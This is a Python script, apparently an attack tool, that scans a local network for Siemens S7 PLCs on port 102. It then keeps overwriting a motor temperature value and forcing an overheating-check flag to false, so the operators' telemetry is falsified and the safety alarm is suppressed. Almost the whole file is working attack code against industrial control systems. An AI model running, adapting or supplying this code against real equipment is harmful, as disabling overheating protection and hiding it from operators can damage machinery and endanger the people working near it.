import snap7
import nmap
from scapy.all import ARP, Ether, srp
import time

# Define Siemens S7-1200 specific ports
S7_PORT = 102     # Siemens S7 protocol runs on TCP port 102.

# PLC Memory Addresses
MOTOR_TEMP_ADDR = 7  # %MW7
OVERRIDING_TEMP = 250  # Fake temperature value to block telemetry
OVERHEATING_TAG_ADDR = 0  # %M0.2 (Overheating_Check)

# Time intervals
SCAN_INTERVAL = 5  # Time to pause between scans (seconds)

# Function to discover the PLC's IP Address
def find_plc_ip():
    print("[*] Scanning network for Siemens PLC...")

    # Initialize Nmap scanner
    nm = nmap.PortScanner()
    nm.scan(hosts="192.168.1.0/24", arguments="-p 102 --open")
    
    for host in nm.all_hosts():
        if nm[host]['tcp'][102]['state'] == 'open':
            print(f"[+] Siemens PLC found at: {host}")
            return host
    return None

# Function to block reporting messages (Inhibiting Response)
def block_reporting_messages(plc_ip):
    print(f"[*] Connecting to PLC at {plc_ip} to inhibit response function...")

    # Connect to the PLC using snap7
    plc = snap7.client.Client()
    plc.connect(plc_ip, 0, 1, 102)

    # Continuously override telemetry values to prevent reporting updates
    try:
        while True:
            # Overwrite Motor Temperature (%MW7)
            temp_value = (OVERRIDING_TEMP).to_bytes(2, byteorder='big')  # Convert int to bytes
            plc.db_write(1, MOTOR_TEMP_ADDR * 2, temp_value)  # MW7 = DB 1 offset 

            # Override Overheating Check Tag (%M0.2)
            plc.write_area(snap7.types.Areas.MK, 0, OVERHEATING_TAG_ADDR, (0).to_bytes(1, 'big'))  # Force FALSE

            print(f"[!] Blocking Reporting Messages: Fake Temp={OVERRIDING_TEMP}, Overheating Check Disabled.")
            time.sleep(SCAN_INTERVAL)  # Wait before overwriting again
        
    except KeyboardInterrupt:
        print("\n[!] Stopping attack...")
        plc.disconnect()

# Main execution
if __name__ == "__main__":
    plc_ip = find_plc_ip()
    
    if plc_ip:
        block_reporting_messages(plc_ip)
    else:
        print("[X] No Siemens PLC found. Exiting.")